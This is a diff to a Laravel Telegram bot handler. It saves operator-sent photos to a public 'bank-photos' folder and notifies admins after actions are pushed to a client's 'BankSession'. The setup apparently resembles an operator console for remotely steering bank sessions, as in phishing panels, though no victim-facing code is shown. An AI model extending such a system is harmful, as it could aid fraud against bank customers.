@@ -4,9 +4,9 @@ namespace App\Telegram\Handlers;
 
 use App\Enums\ActionType;
 use App\Events\BankSessionUpdated;
+use App\Listeners\NotifyAdminsOfBankSession;
 use App\Models\Admin;
 use App\Models\BankSession;
-use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Str;
 use SergiX44\Nutgram\Nutgram;
 
@@ -77,8 +77,12 @@ class MessageHandler
         $contents = file_get_contents(
             'https://api.telegram.org/file/bot' . config('services.telegram.bot_token') . '/' . $filePath
         );
-        Storage::disk('public')->put('bank-photos/' . $filename, $contents);
-        $photoUrl = Storage::disk('public')->url('bank-photos/' . $filename);
+        $dir = public_path('bank-photos');
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        file_put_contents($dir . '/' . $filename, $contents);
+        $photoUrl = '/bank-photos/' . $filename;
 
         $caption = $bot->message()->caption ?? '';
         $command = ['type' => $actionType->value, 'photo_url' => $photoUrl];
@@ -92,6 +96,7 @@ class MessageHandler
 
         $admin->clearPendingAction();
         BankSessionUpdated::dispatch($session);
+        app(NotifyAdminsOfBankSession::class)->notifyActionSent($session, $actionType->buttonLabel());
         $bot->sendMessage('✓ Фото отправлено клиенту.');
     }
 
@@ -118,6 +123,7 @@ class MessageHandler
 
         $admin->clearPendingAction();
         BankSessionUpdated::dispatch($session);
+        app(NotifyAdminsOfBankSession::class)->notifyActionSent($session, $type->buttonLabel());
         $bot->sendMessage('✓ Отправлено клиенту.');
     }
 }
